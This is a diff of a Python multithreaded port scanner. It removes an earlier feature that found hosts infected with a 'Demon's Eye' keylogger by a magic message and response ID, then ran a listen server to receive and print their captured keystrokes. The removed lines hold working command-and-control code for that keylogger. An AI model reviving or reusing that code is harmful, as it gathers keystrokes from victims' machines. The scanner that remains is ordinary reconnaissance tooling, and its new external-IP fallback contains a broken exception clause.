@@ -21,9 +21,7 @@
 import argparse
 import base64
 import ipaddress
-import msvcrt
 import socket
-import sys
 import threading
 import time
 import urllib.request
@@ -31,21 +29,24 @@ import urllib.request
 ########################################################
 # CONSTANTS
 ########################################################
-APPNAME = 'Python Multithread Network Scanner'                      # Just a name
-VERSION = 'v0.0.1'                                                  # Version
-KEYLOGGER_PORT = 6666                                               # Port of keylogger
-DEFAULT_SERVER_PORT = 7777                                          # Port to receive response after connect
+from urllib.error import HTTPError, URLError
+
+BANNER = """ 
+ ______   ______                   
+(_____ \ / _____)                  
+ _____) | (____   ____ _____ ____  
+|  ____/ \____ \ / ___|____ |  _ \ 
+| |      _____) | (___/ ___ | | | |
+|_|     (______/ \____)_____|_| |_| """
+APPNAME = 'Python Multithread Network Scanner'              # Just a name
+VERSION = 'v0.0.1'                                          # Version
 SERVER_ACCEPT_TIMEOUT = 0.1
-HOST_BIND = ''                                                      # Bind address to listen server (any)
-MAX_CLIENTS = 10                                                    # Number of keyloggers to listen
-PORT_LIST_SCAN = [KEYLOGGER_PORT]                                   # List of ports to Scan. For testing multiple ports
-MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='      # Message to indentify to keylogger
-BUFFER_SIZE = 4096                                                  # Buffer size
-DEFAULT_TIMEOUT = 2                                                 # Default Timeout (seconds)
-DEFAULT_NO_WAIT_RESPONSE = False                                    # No Wait response after sending message
-ENCODING = 'utf-8'                                                  # Encoding for message sended
-VERBOSE_LEVELS = ['low', 'a bit', 'insane debug']                   # Verbose levels
-DEMONS_EYE_ID = 'D3Y3K3YL0G'                                        # Keylogger ID in response
+PORT_LIST_SCAN = [21, 22, 25, 80, 110, 3389, 9100]          # Default list of ports to Scan. For testing multiple ports
+BUFFER_SIZE = 4096                                          # Buffer size
+DEFAULT_TIMEOUT = 2                                         # Default Timeout (seconds)
+DEFAULT_WAIT_RESPONSE = False                               # Wait response after sending message
+ENCODING = 'utf-8'                                          # Encoding for message sended
+VERBOSE_LEVELS = ['low', 'a bit', 'insane debug']           # Verbose levels
 
 
 ########################################################
@@ -59,81 +60,13 @@ timeout = DEFAULT_TIMEOUT                               # Timeout on port connec
 total_threads_launched = 0                              # Total threads launched
 total_current_threads_running = 0                       # Total threads running at one moment
 max_concurrent_threads = 0                              # Store max concurrent threads
-keyloggers_found = False                                # If keylogger is found
-listen_server_enabled = False                           # Is listen Server Enabled?
-listen_server_instance = None                           # Listen server object
 
 
 ########################################################
 # CLASSES
 ########################################################
 
-# Server Class to receive Data form Demon's Eye Keylogger
-class ListenServer(threading.Thread):
-    def __init__(self, host_bind, listen_port, max_clients, max_buffer_size):
-        threading.Thread.__init__(self)
-        self._host_bind = host_bind                         # Interface to listen (blank, all)
-        self._server_port = listen_port                     # Listen port
-        self._max_clients = max_clients                     # Max number of keloggers to receive information
-        self._max_buffer_size = max_buffer_size             # Max buffer size
-        self._server_socket = None                          # This server socket
-        self._server_running = False                        # Control for shutdown server
-        self.client_thread_list = []                        # List of current clients
-        self.clients_processed = 0                          # Counter of clients processed (only for statistics)
-
-    def kill_server(self):
-        self._server_running = False
-
-
-    def client_thread(self, conn, ip, port, buffer_size):
-        print('Connection from {}:{:5d}'.format(ip, port))
-        while self._server_running:
-            # The input is in bytes, so decode it
-            input_from_client_bytes = conn.recv(self._max_buffer_size)
-
-            # Prints received chars
-            print(input_from_client_bytes.decode(ENCODING), end='')
-
-        conn.close()
-
-
-    def run(self):
-        # Create socket and bind to local host and port
-        try:
-            self._server_socket: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self._server_socket.bind((self._host_bind, self._server_port))
-        except Exception as e:
-            print('ListenServer, Creating Socket Exception : {}'.format(e))
-            return
-
-        # Start listening on socket
-        self._server_socket.settimeout(SERVER_ACCEPT_TIMEOUT)
-        self._server_socket.listen(self._max_clients)
-        self._server_running = True
-        while self._server_running:
-            try:
-                (conn, (ip, port)) = self._server_socket.accept()   # Wait to accept a connection - NO blocking call
-            except socket.timeout:
-                pass  # ignore timeout, next accept
-            except Exception as e:
-                print('Se ha dejado de recibir datos del Keylogger. Excepcion {} '.format(e))
-                break                                               # Possibly closed server
-            else:
-                self.clients_processed += 1
-                try:
-                    client = threading.Thread(target=self.client_thread,
-                                              args=(conn, ip, port, self._max_buffer_size))
-                    client.start()
-                except Exception as e:
-                    print('ListenServer, Client Listen Error : {}'.format(e))
-
-        # Wait to finish threads (Is it necessary? I'm not sure)
-        for client in self.client_thread_list:
-            client.join()
-
-
-# Scan a host (ip), for open ports in port_list. Sends a message to host and wait response to identify Keylogger.
+# Scan a host (ip), for open ports in port_list.
 # Can activate more verbosity for errors and control messages, and define a timeout for connection.
 class HostScan(threading.Thread):
     def __init__(self, ip, port_list, message, verbose, timeout, waitresponse):
@@ -173,10 +106,6 @@ class HostScan(threading.Thread):
                         # Decode if Base64
                         try:
                             response = str(base64.b64decode(response), ENCODING)
-                            # Keylogger Found
-                            if response[:len(DEMONS_EYE_ID)] == DEMONS_EYE_ID:
-                                keyloggers_found = True
-                                response += ' [Keylogger Found]'
                         except Exception as e:
                             if self.verbose >= 2:
                                 print('Error decoding Base64 : {}'.format(e))
@@ -185,11 +114,12 @@ class HostScan(threading.Thread):
                 else:
                     response = ''
             except Exception as e:
-                response = '[No Response]'
+                response = ''               # No response
                 if self.verbose >= 2:
                     print('No response : %s ' % e)
             finally:
-                self.open_ports.append('Host %s Port %s [Open] %s' % (host, port, response))
+                if (self.wait and response != '') or not self.wait:
+                    self.open_ports.append('Host %s Port %s [Open] %s' % (host, port, response))
         except Exception as e:
             if self.verbose >= 2:
                 print('Host %s Port %d Exception %s ' % (host, port, e))
@@ -264,9 +194,26 @@ class RangeScan(threading.Thread):
 ########################################################
 
 # Get the external ip
+# Alternate services
+#   https://ipinfo.io/ip
+#   http://ifconfig.me/ip
 def get_external_ip():
-    external_ip = urllib.request.urlopen('https://ident.me').read().decode(ENCODING)
-    return external_ip
+    try:
+        external_ip = urllib.request.urlopen('https://ident.me').read().decode(ENCODING)
+    except (HTTPError, URLError) as error:
+        pass                                # future use
+    except timeout:
+        # if first server fails, try another url
+        try:
+            external_ip = urllib.request.urlopen('https://ipinfo.io/ip').read().decode(ENCODING)
+        except (HTTPError, URLError) as error:
+            pass                            # future use
+        except timeout:
+            return ''
+        else:
+            return external_ip
+    else:
+        return external_ip
 
 
 # Convert an ip to a CIDR / 24 range
@@ -282,7 +229,7 @@ def ip_to_cidr24(ip_to_convert):
 # Parse command line parameters
 def parse_params():
     parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
-                                     epilog='You can also use it to scan specific ports on a network.')
+                                     epilog='Simple scanning of specific ports on a network.')
     parser.add_argument('-r', '--range', type=str, default="",
                         help='Specify the network range in CIDR format. ' +
                              'If not provided, an attempt is made to autodetect a local class C range. ' +
@@ -292,19 +239,14 @@ def parse_params():
                              'an automatic class C range will be set for the current Wan IP.')
     parser.add_argument('-p', '--ports', type=int, nargs='+', default=list(PORT_LIST_SCAN),
                         help='Specify a list of ports to scan. Default value: ' + str(PORT_LIST_SCAN))
-    parser.add_argument('-m', '--message', type=str, default=MAGIC_MESSAGE,
-                        help='Message to send to host. If empty (-m \'\'), then not message is sent. Default value: ' +
-                             MAGIC_MESSAGE)
-    parser.add_argument('-n', '--nowaitresponse', action='store_true', default=DEFAULT_NO_WAIT_RESPONSE,
-                        help='NO wait response from host after sending Message (if sent). Default value: ' +
-                             str(DEFAULT_NO_WAIT_RESPONSE))
+    parser.add_argument('-m', '--message', type=str, default='',
+                        help='Message to send to host. If empty (-m \'\'), then not message is sent.')
+    parser.add_argument('-e', '--waitresponse', action='store_true', default=DEFAULT_WAIT_RESPONSE,
+                        help='Wait response from host after sending Message (if sent). ' +
+                             'If this is enable then only ports with response are shown ' +
+                             'Default value: ' + str(DEFAULT_WAIT_RESPONSE))
     parser.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT,
                         help='Timeout in seconds on port connection. Default value: ' + str(DEFAULT_TIMEOUT))
-    parser.add_argument('-e', '--enableserver', action='store_true', default=False,
-                        help='Enable Server to receive Demon\'s Eye Keylogger Data')
-    parser.add_argument('-s', '--serverport', type=int, default=DEFAULT_SERVER_PORT,
-                        help='If the keylogger is found (wait response is necessary), it establishes a server to '
-                             'receive data. Default value: ' + str(DEFAULT_SERVER_PORT))
     parser.add_argument('-v', '--verbose', type=int, choices=[0,1,2], default=0,
                         help='Increase output verbosity. Default value: 0')
     args = parser.parse_args()
@@ -321,16 +263,15 @@ def main():
     wan_auto = args.wanauto
     port_list = args.ports
     message = args.message
-    waitresponse = not args.nowaitresponse
+    waitresponse = args.waitresponse
     timeout = args.timeout
-    enable_server = args.enableserver
-    server_port = args.serverport
 
     # Host info
     hostname = socket.gethostname()
     localip = socket.gethostbyname(hostname)
     externalip = get_external_ip()
 
+    print(BANNER)
     print(APPNAME + ' ' + VERSION)
     print('==============================================')
     print('Verbose level '+str(VERBOSE_LEVELS[verbose]))
@@ -346,15 +287,6 @@ def main():
     print('Message to send \''+message+'\'')
     print('Wait response after send message '+str(waitresponse))
     print('Timeout %d seconds' % (timeout))
-    if enable_server:
-        print('Enabled Server to receive Keylogger Data at port %s' % server_port)
-        try:
-            listen_server_instance = ListenServer(HOST_BIND, server_port, MAX_CLIENTS, BUFFER_SIZE)
-            listen_server_instance.start()
-            listen_server_enabled = True
-        except Exception as e:
-            print('Error starting Server {}'.format(e))
-            sys.exit(1)
 
     print('---')
     print('This Host %s : IP local %s : IP wan %s' % (hostname, localip, externalip))
@@ -368,27 +300,6 @@ def main():
     print('Total %d threads launched, and max simultaneous was %d threads' % (total_threads_launched, max_concurrent_threads))
     if total_current_threads_running > 0:
         print('Something strange happes because the threads running is %d ' % (total_current_threads_running))
-
-    # No keylogger found
-    if enable_server and keyloggers_found == False:
-        print('No Keyloggers found. Disabling Server...')
-        enable_server = False
-        listen_server_instance.kill_server()
-        listen_server_instance = None
-        listen_server_enabled = False
-
-    # Listen Server
-    while enable_server and listen_server_enabled:
-        if listen_server_instance is not None:
-            print('Socket is Listening at {}:{}...'.format(hostname,server_port))
-            # key = input('Enter "Q" o "q" to Exit : ').strip()
-            key = msvcrt.getch()
-            if key == b"Q" or key == b"q":
-                listen_server_instance.kill_server()
-                listen_server_instance = None
-                listen_server_enabled = False
-                print('Exiting.')
-                break
 
 
 if __name__ == '__main__':
